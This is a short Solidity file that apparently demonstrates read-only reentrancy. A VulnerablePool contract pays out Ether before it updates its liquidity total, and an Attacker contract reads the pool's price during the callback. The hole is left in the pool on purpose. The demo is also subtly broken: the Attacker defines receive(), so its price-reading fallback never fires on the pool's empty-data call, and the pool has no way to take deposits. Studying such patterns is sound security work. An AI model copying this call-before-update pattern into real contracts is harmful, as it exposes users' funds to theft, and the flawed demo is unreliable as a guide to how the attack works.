// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerablePool {
    mapping(address => uint) public balances;
    uint public totalLiquidity;

    function removeLiquidity() public {
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        // State is only finalized after the external call.
        totalLiquidity -= amount;
    }

    function getVirtualPrice() public view returns (uint) {
        return address(this).balance / totalLiquidity;
    }

    receive() external payable {}
}

contract Attacker {
    VulnerablePool pool;
    uint public observedPrice;

    constructor(address payable _pool) {
        pool = VulnerablePool(_pool);
    }

    fallback() external payable {
        uint price = pool.getVirtualPrice();
        observedPrice = price;
    }

    function attack() external payable {
        pool.removeLiquidity();
    }

    receive() external payable {}
}
